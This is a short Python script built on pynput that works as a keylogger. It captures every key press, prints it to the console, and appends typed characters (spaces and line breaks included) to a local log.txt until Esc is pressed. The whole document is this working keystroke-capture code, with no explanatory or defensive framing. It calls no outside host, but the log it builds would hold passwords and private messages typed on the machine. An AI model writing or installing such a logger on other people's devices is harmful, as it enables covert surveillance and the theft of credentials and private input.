from pynput.keyboard import Key, Listener

keys = []  # Renamed from Key to avoid conflict

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'a') as f:  # Open in append mode
        for key in keys:
            k = str(key).replace("'", "")
            # Handle special keys like space, enter
            if k == "Key.space":
                f.write(" ")  # Add a space
            elif k == "Key.enter":
                f.write("\n")  # Add a newline
            elif k.startswith("Key."):
                continue  # Skip other special keys
            else:
                f.write(k)  # Write alphanumeric keys
        keys.clear()  # Clear the keys list after writing

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False  # Stop the listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
